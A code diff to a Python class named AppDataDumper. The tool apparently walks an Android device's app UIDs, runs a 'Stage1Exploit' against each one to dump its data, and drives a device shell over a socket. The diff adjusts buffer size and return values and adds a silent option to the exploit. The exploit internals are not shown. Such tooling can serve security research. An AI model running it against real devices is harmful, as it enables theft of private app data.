@@ -49,19 +49,19 @@ class AppDataDumper:
                     device_socket.sendall(b"echo completed\n")
                     
                     while True:
-                        data = device_socket.recv(4096)
-                        if b"completed" in data:
+                        data = device_socket.recv(10000)
+                        if "completed" in data.decode():
                             device_socket.sendall(b"kill $$\n") # kill self
-                            break
+                            return True
                 except ConnectionRefusedError:
                     print("\tConnection refused, retrying...")
                     time.sleep(1)
                     continue
                 except Exception as e:
                     print(e)
-                    return False
+                    break
                     
-        return True
+        return False
         
     def run(self) -> None:
         uid_pkg_map = self.list_uids()
@@ -72,7 +72,7 @@ class AppDataDumper:
             
             print(f"Dumping UID {uid} on port {self.port} with package(s): '{"System" if (uid == 1000) else ', '.join(pkgs)}'")
         
-            exploit = Stage1Exploit(port=self.port, target_uid=uid, target_package=pkgs[0])
+            exploit = Stage1Exploit(port=self.port, target_uid=uid, target_package=pkgs[0], silent=True)
             
             if not exploit.exploit_stage1():
                 failed_uid_pkg_map[uid] = pkgs
